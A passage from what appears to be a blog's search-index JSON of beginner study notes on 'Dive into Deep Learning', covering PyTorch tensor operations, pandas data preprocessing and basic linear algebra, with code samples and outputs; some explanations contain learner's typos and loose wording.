combined in,and dim = 0 means combined in rows,dim = 1 means in columns.</p>\n<h5><span id=\"sum\">sum</span></h5><p>caculating the sum of all the tensors in one element.</p>\n<h3><span id=\"broadcasting\">Broadcasting</span></h3><p>transform the tensor by filling the blank using copies of values.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-10%20at%2010.50.57%20AM.png\" alt=\"Screen Shot 2023-03-10 at 10.50.57 AM\"></p>\n<p>eg:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = tensor ([[<span class=\"number\">0</span>,<span class=\"number\">0</span>],[<span class=\"number\">1</span>,<span class=\"number\">1</span>],[<span class=\"number\">2</span>,<span class=\"number\">2</span>]])</span><br><span class=\"line\">b = tensor ([[<span class=\"number\">0</span>,<span class=\"number\">1</span>],[<span class=\"number\">0</span>,<span class=\"number\">1</span>],[<span class=\"number\">0</span>,<span class=\"number\">1</span>]])</span><br><span class=\"line\">a+b</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[0, 1],</span></span><br><span class=\"line\"><span class=\"string\">        [1, 2],</span></span><br><span class=\"line\"><span class=\"string\">        [2, 3]])</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"saving-memory\">Saving Memory</span></h2><h5><span id=\"id\">id</span></h5><p>the Uniquely identifies of values in python</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">before = <span class=\"built_in\">id</span>(Y) </span><br><span class=\"line\">Y = Y + X<span class=\"comment\">#create a new variable with the same name Y</span></span><br><span class=\"line\"><span class=\"built_in\">id</span>(Y) == before <span class=\"comment\"># not equivalent,because the new memory sapce has be allocated</span></span><br><span class=\"line\"><span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h4><span id=\"in-place-operations\">in-place operations</span></h4><p>manipulate the elements in the tensor ,but do not change the tensor itself.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Z = torch.zeros_like(Y)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;id(Z):&#x27;</span>, <span class=\"built_in\">id</span>(Z))</span><br><span class=\"line\">Z[:] = X + Y</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;id(Z):&#x27;</span>, <span class=\"built_in\">id</span>(Z))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">id(Z): 5189686192 id doesn&#x27;t change</span></span><br><span class=\"line\"><span class=\"string\">id(Z): 5189686192&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2><span id=\"conversion-to-other-python-objects\">Conversion to Other Python Objects</span></h2><h4><span id=\"numpy\">numpy</span></h4><p>transform tensor into bumpy tensor</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">A = X.numpy()</span><br><span class=\"line\">B = torch.from_numpy(A)</span><br><span class=\"line\"><span class=\"built_in\">type</span>(A), <span class=\"built_in\">type</span>(B)</span><br></pre></td></tr></table></figure>\n<p>transform tensor into python scalar</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = torch.tensor([<span class=\"number\">3.5</span>])</span><br><span class=\"line\">a, a.item(), <span class=\"built_in\">float</span>(a), <span class=\"built_in\">int</span>(a)</span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"03_data_processing","url":"/2023/03/08/D2L_003_data_preprocessing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-nvSklFWQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>\n<h2><span id=\"data-preprocessing\">data preprocessing</span></h2><h4><span id=\"1-create-a-manul-dataset\">1) create a manul dataset</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"></span><br><span class=\"line\">os.makedirs(os.path.join(<span class=\"string\">&#x27;..&#x27;</span>, <span class=\"string\">&#x27;data&#x27;</span>), exist_ok=<span class=\"literal\">True</span>)</span><br><span class=\"line\">data_file = os.path.join(<span class=\"string\">&#x27;..&#x27;</span>, <span class=\"string\">&#x27;data&#x27;</span>, <span class=\"string\">&#x27;house_tiny.csv&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(data_file, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(<span class=\"string\">&#x27;&#x27;&#x27;NumRooms,RoofType,Price</span></span><br><span class=\"line\"><span class=\"string\">NA,NA,127500</span></span><br><span class=\"line\"><span class=\"string\">2,NA,106000</span></span><br><span class=\"line\"><span class=\"string\">4,Slate,178100</span></span><br><span class=\"line\"><span class=\"string\">NA,NA,140000&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">data = pd.read_csv(data_file)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-10%20at%2011.52.10%20AM.png\" alt=\"Screen Shot 2023-03-10 at 11.52.10 AM\"></p>\n<p>Manually input all the values of each rows and colmuns ,then save it in csv(Comma-separated values).</p>\n<p>and we usually use <code>pandas</code> to load the csv file, so do some manipulations.</p>\n<h4><span id=\"2-clear-the-lost-data\">2) clear the lost data</span></h4><p>typical methods to address the lost datas are</p>\n<ol>\n<li>insert numbers with estimates values (<em>imputation</em> )</li>\n<li>discards the whole rows or columns that contain missing values(<em>deletion</em>)</li>\n</ol>\n<h5><span id=\"insert\">insert</span></h5><p>using <code>iloc</code>,with indicate the explict location of the elements in tables to separate the specific element.And the code below presents how we can divide the table in to input (features of the rooms) and the output(price of the rooms)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">inputs, targets = data.iloc[:, <span class=\"number\">0</span>:<span class=\"number\">2</span>], data.iloc[:, <span class=\"number\">2</span>]</span><br><span class=\"line\">inputs,targets</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(   NumRooms RoofType</span></span><br><span class=\"line\"><span class=\"string\"> 0       NaN      NaN</span></span><br><span class=\"line\"><span class=\"string\"> 1       2.0      NaN</span></span><br><span class=\"line\"><span class=\"string\"> 2       4.0    Slate</span></span><br><span class=\"line\"><span class=\"string\"> 3       NaN      NaN,</span></span><br><span class=\"line\"><span class=\"string\"> 0    127500</span></span><br><span class=\"line\"><span class=\"string\"> 1    106000</span></span><br><span class=\"line\"><span class=\"string\"> 2    178100</span></span><br><span class=\"line\"><span class=\"string\"> 3    140000</span></span><br><span class=\"line\"><span class=\"string\"> Name: Price, dtype: int64)</span></span><br><span class=\"line\"><span class=\"string\"> &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h5><span id=\"get_dummies\">get_dummies</span></h5><p>Convert categorical variable into dummy/indicator variables.<br>just like a simple truth table —&gt; use the form of truth table to visilize whether the item is NaN or not.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-11%20at%2011.19.44%20AM.png\" alt=\"Screen Shot 2023-03-11 at 11.19.44 AM\"></p>\n<h5><span id=\"fillna\">fillna</span></h5><p>fillna allows us to fill the whole NaN number with stuffs,one of the choice is mean of the row.<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-11%20at%2011.24.52%20AM.png\" alt=\"Screen Shot 2023-03-11 at 11.24.52 AM\"><br>once we point out the locations of all the NaN, we can eazily fill them with the mean of the input values. </p>\n<h4><span id=\"3-conversion-to-the-tensor-format\">3) Conversion to the Tensor Format</span></h4><p>Now we clear all the lost values,and it’s time to convert the table into  a tensor !<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"></span><br><span class=\"line\">X, y = torch.tensor(inputs.values), torch.tensor(targets.values)</span><br><span class=\"line\">X, y</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(tensor([[3., 0., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [2., 0., 1.],</span></span><br><span class=\"line\"><span class=\"string\">         [4., 1., 0.],</span></span><br><span class=\"line\"><span class=\"string\">         [3., 0., 1.]], dtype=torch.float64),</span></span><br><span class=\"line\"><span class=\"string\"> tensor([127500, 106000, 178100, 140000]))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"4-discussion-amp-summary\">4) Discussion &amp; Summary</span></h4><h5><span id=\"prospection\">prospection</span></h5><pre><code>1. dataset can be larger \n2. data visualization with tools like seaborn or matplotlib,etc.\n3. etc.\n</code></pre><h5><span id=\"summary\">summary</span></h5><p>So when we get the original dataset, regardless of it’s size,what we should to do is obeying the following steps.</p>\n<ol>\n<li>separate the input values and the output values .In general , the output is what we want to predict.</li>\n<li>examniate the lost datas, point out the NaN or other bad datas with clear form to present.</li>\n<li>replace (or deplete) the bad data.</li>\n<li>convert the processed data into tensor form.</li>\n</ol>\n<h4><span id=\"5-exercises\">5) Exercises</span></h4><h5><span id=\"1\">1</span></h5><p>Try loading datasets, e.g., Abalone from the <a href=\"https://archive.ics.uci.edu/ml/datasets.php\">UCI Machine Learning Repository</a> and inspect their properties. What fraction of them has missing values? What fraction of the variables is numerical, categorical, or text?</p>\n<h5><span id=\"2\">2</span></h5><p>Try out indexing and selecting data columns by name rather than by column number. The pandas documentation on <a href=\"https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html\">indexing</a> has further details on how to do this.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"04_ Linear Algebra","url":"/2023/03/10/D2L_004_%20Linear%20Algebra/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"41-basic-manipulation-of-linear-algebra\">4.1 Basic Manipulation of Linear Algebra</span></h2><h3><span id=\"411-vector-addition\">4.1.1 Vector Addition</span></h3><script type=\"math/tex; mode=display\">\nc = a + b</script><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/vector.png\" alt=\"vector\"></p>\n<h3><span id=\"412-vector-multiplication\">4.1.2 Vector Multiplication</span></h3><script type=\"math/tex; mode=display\">\nc = \\alpha \n\\cdot a</script><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/multiplication.png\" alt=\"multiplication\"></p>\n<h3><span id=\"413-metrix-multiplication\">4.1.3 Metrix Multiplication</span></h3><h4><span id=\"4131-abstract-defination\">4.1.3.1 Abstract Defination</span></h4><script type=\"math/tex; mode=display\">\n{\\displaystyle (AB)_{ij}=\\sum _{r=1}^{n}a_{ir}b_{rj}=a_{i1}b_{1j}+a_{i2}b_{2j}+\\cdots +a_{in}b_{nj}}</script><h4><span id=\"4132-caculation-mathod\">4.1.3.2 Caculation Mathod</span></h4><p>assume metrix A and B,</p>\n<script type=\"math/tex; mode=display\">\n{  {A}}={\\begin{vmatrix}a_11&a_12\\\\a_21&a_22\\end{vmatrix}}</script><script type=\"math/tex; mode=display\">\n{  {B}}={\\begin{vmatrix}b_11&b_12\\\\b_21&b_22\\end{vmatrix}}</script><p>then,</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-12%20at%209.04.17%20PM.png\" alt=\"Screen Shot 2023-03-12 at 9.04.17 PM\"></p>\n<p>example:</p>\n<script type=\"math/tex; mode=display\">\n{\\begin{bmatrix}1&0&2\\\\-1&3&1\\end{bmatrix}}\\cdot {\\begin{bmatrix}3&1\\\\2&1\\\\1&0\\end{bmatrix}}</script><script type=\"math/tex; mode=display\">\n</script><script type=\"math/tex; mode=display\">={\\begin{bmatrix}1{\\begin{bmatrix}3&1\\end{bmatrix}}+0{\\begin{bmatrix}2&1\\end{bmatrix}}+2{\\begin{bmatrix}1&0\\end{bmatrix}}\\\\-1{\\begin{bmatrix}3&1\\end{bmatrix}}+3{\\begin{bmatrix}2&1\\end{bmatrix}}+1{\\begin{bmatrix}1&0\\end{bmatrix}}\\end{bmatrix}}</script><script type=\"math/tex; mode=display\">\n</script><script type=\"math/tex; mode=display\">={\\begin{bmatrix}{\\begin{bmatrix}3&1\\end{bmatrix}}+{\\begin{bmatrix}0&0\\end{bmatrix}}+{\\begin{bmatrix}2&0\\end{bmatrix}}\\\\{\\begin{bmatrix}-3&-1\\end{bmatrix}}+{\\begin{bmatrix}6&3\\end{bmatrix}}+{\\begin{bmatrix}1&0\\end{bmatrix}}\\end{bmatrix}}</script><script type=\"math/tex; mode=display\">\n</script><script type=\"math/tex; mode=display\">={\\begin{bmatrix}5&1\\\\4&2\\end{bmatrix}}</script><h4><span id=\"4133-characteristic\">4.1.3.3 Characteristic</span></h4><p>1 ) can’t be exchanged (AB $\\neq$ BA)</p>\n<h3><span id=\"414-norm\">4.1.4 Norm</span></h3><script type=\"math/tex; mode=display\">c = A \\cdot b ,\\ \\ \\ \\ hence \\ \\|c\\| \\ \\leqslant \\|A\\| \\cdot \\|b\\|</script><p>1) metrix norm : the minimun value to satisfy the above formula<br>2) Frobenius Norm : $|A|_{Frob} = \\left[ \\sum_{ij}A_{ij}^2 \\right]^{1/2}$(commonly used)</p>\n<h3><span id=\"415-special-metrix\">4.1.5 Special Metrix</span></h3><h4><span id=\"4151-symmetic-amp-anti-symmectric\">4.1.5.1 Symmetic  &amp; Anti-Symmectric</span></h4><h5><span id=\"symmtric\">symmtric</span></h5><script type=\"math/tex; mode=display\">A_{ij} = A_{ji}</script><h5><span id=\"anti-symmetric\">Anti-symmetric</span></h5><script type=\"math/tex; mode=display\">A_{ij} = -A_{ji}</script><h4><span id=\"4152-positive-definite-matrix\">4.1.5.2 Positive-Definite Matrix</span></h4><h4><span id=\"4154-permutation-matrix\">4.1.5.4 Permutation Matrix</span></h4><script type=\"math/tex; mode=display\">\nP \\ where \\ P_{ij} = 1 \\ , if \\ and \\ only \\ if \\ j = \\pi(i)</script><p>1) Permutation Matrix is orthogonal matrix.</p>\n<h4><span id=\"4155-feature-matrix\">4.1.5.5 Feature Matrix</span></h4><p>The Matrix which can’t be changed by the multipled matrix</p>\n<script type=\"math/tex; mode=display\">\nAx = \\lambda x , \\ then \\ \\lambda \\ is \\ a \\  featrue \\ matrix</script><h2><span id=\"42-relization-in-python\">4.2  Relization in python</span></h2><h3><span id=\"421-scalars\">4.2.1 Scalars</span></h3><p>Doesn’t have direction ,dimension or other things.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.tensor(<span class=\"number\">3.0</span>)</span><br><span class=\"line\">y = torch.tensor(<span class=\"number\">2.0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">x + y, x * y, x / y, x**y</span><br><span class=\"line\"><span class=\"comment\"># x**y ==&gt; 3=x^y</span></span><br><span class=\"line\"><span class=\"comment\"># (tensor(5.), tensor(6.), tensor(1.5000), tensor(9.))</span></span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"422-vectors\">4.2.2 Vectors</span></h3><p>Consider Vectors as the array of scalars, like a fixed length list of scalars.</p>\n<p>Using <code>arrange</code>to generate the tensor vector.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.arange(<span class=\"number\">3</span>)</span><br><span class=\"line\">x</span><br><span class=\"line\"><span class=\"comment\">#tensor([0, 1, 2])</span></span><br></pre></td></tr></table></figure></p>\n<p>We can visualize vectors by stacking their elements vertically.</p>\n<script type=\"math/tex; mode=display\">\nx_{i} = \\begin{vmatrix} x_{1} \\\\ x_{2} \\\\ x_{3} \\\\ \\dots \\\\ xi \\end{vmatrix}</script><p>using <code>index</code>to access the element in vector<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x[<span class=\"number\">0</span>],<span class=\"built_in\">len</span>(x)</span><br><span class=\"line\"><span class=\"comment\">#(tensor(0), 3)</span></span><br></pre></td></tr></table></figure></p>\n<h3><span id=\"423-matric\">4.2.3 Matric</span></h3><p>Using <code>reshape</code> to generate the m x n matrix.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">M = torch.arange(<span class=\"number\">15</span>).reshape(<span class=\"number\">3</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\">M</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[ 0,  1,  2,  3,  4],</span></span><br><span class=\"line\"><span class=\"string\">        [ 5,  6,  7,  8,  9],</span></span><br><span class=\"line\"><span class=\"string\">        [10, 11, 12, 13, 14]])</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"4231-matric-transpose\">4.2.3.1 Matric transpose</span></h4><p>Exchange the rows with colmuns along the diagonal.</p>\n<script type=\"math/tex; mode=display\">B = A ^ T</script><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">M.T</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[ 0,  5, 10],</span></span><br><span class=\"line\"><span class=\"string\">        [ 1,  6, 11],</span></span><br><span class=\"line\"><span class=\"string\">        [ 2,  7, 12],</span></span><br><span class=\"line\"><span class=\"string\">        [ 3,  8, 13],</span></span><br><span class=\"line\"><span class=\"string\">        [ 4,  9, 14]])</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>For a stmmetric matrix ,the transpose equals to itself.</p>\n<h3><span id=\"424-tensors\">4.2.4 Tensors</span></h3><p>Tensors give us a generic way to describe extensions to nth-order arrays.<br>For example ,vector is the promotion of scalar, and matrix is the promotion of the vector,so tensor is a promotion of the matrix,the dimension of the tensor can be enlarged in 3,4,…dimensions,etc.<br>And the rule to create the tensor is from right to left : 4 is scalar. 3 is array ,then 2 is the higer order.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">torch.arange(<span class=\"number\">24</span>).reshape(<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[ 0,  1,  2,  3],</span></span><br><span class=\"line\"><span class=\"string\">         [ 4,  5,  6,  7],</span></span><br><span class=\"line\"><span class=\"string\">         [ 8,  9, 10, 11]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[12, 13, 14, 15],</span></span><br><span class=\"line\"><span class=\"string\">         [16, 17, 18, 19],</span></span><br><span class=\"line\"><span class=\"string\">         [20, 21, 22, 23]]])</span></span><br><span class=\"line\"><span class=\"string\">         &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"425-basic-arithmetic\">4.2.5 Basic Arithmetic</span></h3><h4><span id=\"4251-multiplication-and-addition\">4.2.5.1 Multiplication and Addition</span></h4><p>The basic rule of arithmatic operation is simial as the vectors or matrixs.(simple linear addition)</p>\n <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"> tensor([[<span class=\"number\">0</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">        [<span class=\"number\">2</span>, <span class=\"number\">3</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">5</span>],</span><br><span class=\"line\">        [<span class=\"number\">6</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">8</span>, <span class=\"number\">9</span>]])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [14]:</span></span><br><span class=\"line\">A+b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[14]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">tensor([[ <span class=\"number\">0</span>,  <span class=\"number\">2</span>],</span><br><span class=\"line\">        [ <span class=\"number\">4</span>,  <span class=\"number\">6</span>],</span><br><span class=\"line\">        [ <span class=\"number\">8</span>, <span class=\"number\">10</span>],</span><br><span class=\"line\">        [<span class=\"number\">12</span>, <span class=\"number\">14</span>],</span><br><span class=\"line\">        [<span class=\"number\">16</span>, <span class=\"number\">18</span>]])</span><br><span class=\"line\"><span class=\"comment\">#In [15]: </span></span><br><span class=\"line\">A*b <span class=\"comment\">#(Hadamard product)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[15]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">tensor([[ <span class=\"number\">0</span>,  <span class=\"number\">1</span>],</span><br><span class=\"line\">        [ <span class=\"number\">4</span>,  <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">16</span>, <span class=\"number\">25</span>],</span><br><span class=\"line\">        [<span class=\"number\">36</span>, <span class=\"number\">49</span>],</span><br><span class=\"line\">        [<span class=\"number\">64</span>, <span class=\"number\">81</span>]])</span><br></pre></td></tr></table></figure>\n<p>scalar multiply with tensor:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">a = <span class=\"number\">2</span></span><br><span class=\"line\">X = torch.arange(<span class=\"number\">24</span>).reshape(<span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>)</span><br><span class=\"line\">a + X, (a * X).shape</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(tensor([[[ 0,  1,  2,  3],</span></span><br><span class=\"line\"><span class=\"string\">          [ 4,  5,  6,  7],</span></span><br><span class=\"line\"><span class=\"string\">          [ 8,  9, 10, 11]],</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">         [[12, 13, 14, 15],</span></span><br><span class=\"line\"><span class=\"string\">          [16, 17, 18, 19],</span></span><br><span class=\"line\"><span class=\"string\">          [20, 21, 22, 23]]]),</span></span><br><span class=\"line\"><span class=\"string\">          </span></span><br><span class=\"line\"><span class=\"string\"> tensor([[[ 2,  3,  4,  5],</span></span><br><span class=\"line\"><span class=\"string\">          [ 6,  7,  8,  9],</span></span><br><span class=\"line\"><span class=\"string\">          [10, 11, 12, 13]],</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">         [[14, 15, 16, 17],</span></span><br><span class=\"line\"><span class=\"string\">          [18, 19, 20, 21],</span></span><br><span class=\"line\"><span class=\"string\">          [22, 23, 24, 25]]]), add 2</span></span><br><span class=\"line\"><span class=\"string\">          </span></span><br><span class=\"line\"><span class=\"string\"> tensor([[[ 0,  2,  4,  6],</span></span><br><span class=\"line\"><span class=\"string\">          [ 8, 10, 12, 14],</span></span><br><span class=\"line\"><span class=\"string\">          [16, 18, 20, 22]],</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">         [[24, 26, 28, 30],</span></span><br><span class=\"line\"><span class=\"string\">          [32, 34, 36, 38],</span></span><br><span class=\"line\"><span class=\"string\">          [40, 42, 44, 46]]])) multiply with 2</span></span><br><span class=\"line\"><span class=\"string\">          &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"4252-sum\">4.2.5.2 Sum</span></h4><p>using <code>sum()</code>to return the sum value of each elements in a tensor.<br>the returned value, regardless of the shape of the tensor, is always a scalar.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">q = torch.arange(<span class=\"number\">30</span>).reshape(<span class=\"number\">5</span>,<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">qs = q.<span class=\"built_in\">sum</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [23]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">qs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[23]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">tensor(<span class=\"number\">435</span>)</span><br></pre></td></tr></table></figure>\n<p>otherwise, we can indicate the specific axis to caculate the sum:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">q_1 = q.<span class=\"built_in\">sum</span>(axis = <span class=\"number\">0</span>)</span><br><span class=\"line\">q_2 = q.<span class=\"built_in\">sum</span>(axis = <span class=\"number\">1</span>)</span><br><span class=\"line\">q_3 = q.<span class=\"built_in\">sum</span>(axis = [<span class=\"number\">0</span>,<span class=\"number\">1</span>])</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">(tensor([60, 65, 70, 75, 80, 85]),tensor([ 15,  51,  87, 123, 159]),tensor(435))&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h4><span id=\"4253-mean\">4.2.5.3 Mean</span></h4><p>Also a scalar, shows the average value of all the element.(Can also specify the axis  )<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">x = torch.arange(<span class=\"number\">3</span>, dtype=torch.float32)</span><br><span class=\"line\">A</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">tensor([[[ 0.,  1.,  2.,  3.,  4.],</span></span><br><span class=\"line\"><span class=\"string\">         [ 5.,  6.,  7.,  8.,  9.]],</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">        [[10., 11., 12., 13., 14.],</span></span><br><span class=\"line\"><span class=\"string\">         [15., 16., 17., 18., 19.]]])&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">A.mean()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># tensor(9.5000)</span></span><br><span class=\"line\"></span><br><span class=\"line\">A.<span class=\"built_in\">sum</span>() / A.numel()</span><br><span class=\"line\"><span class=\"comment\">#tensor(9.5000)</span></span><br></pre></td></tr></table></figure></p>\n<p>The operation above can be considered as a REDUCTION because both <code>mean</code> and <code>sum</code> will deplete some of the dimension in the tensor.<br>So the function to caculate them without reduction as follows:</p>\n<h5><span id=\"keepdims\">keepdims</span></h5><p>Activate this variable we can keep the dimension with a blank value .<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#In [41]:</span></span><br><span class=\"line\">sum_A = A.<span class=\"built_in\">sum</span>(axis=<span class=\"number\">1</span>, keepdims=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sum_A, sum_A.shape</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[41]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">(tensor([[[ <span class=\"number\">5.</span>,  <span class=\"number\">7.</span>,  <span class=\"number\">9.</span>, <span class=\"number\">11.</span>, <span class=\"number\">13.</span>]],</span><br><span class=\"line\"> </span><br><span class=\"line\">         [[<span class=\"number\">25.</span>, <span class=\"number\">27.</span>, <span class=\"number\">29.</span>, <span class=\"number\">31.</span>, <span class=\"number\">33.</span>]]]),</span><br><span class=\"line\"> torch.Size([<span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#In [42]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">sum_A = A.<span class=\"built_in\">sum</span>(axis=<span class=\"number\">1</span>, keepdims=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sum_A, sum_A.shape</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Out[42]:</span></span><br><span class=\"line\"></span><br><span class=\"line\">(tensor([[ <span class=\"number\">5.</span>,  <span class=\"number\">7.</span>,  <span class=\"number\">9.</span>, <span class=\"number\">11.</span>, <span class=\"number\">13.</span>],</span><br><span class=\"line\">         [<span class=\"number\">25.</span>, <span class=\"number\">27.</span>, <span class=\"number\">29.</span>, <span class=\"number\">31.</span>, <span class=\"number\">33.</span>]]),</span><br><span class=\"line\"> torch.Size([<span class=\"number\">2</span>, <span class=\"number\">5</span>]))</span><br></pre></td></tr></table></figure></p>\n<p> we can divide <code>A</code>by 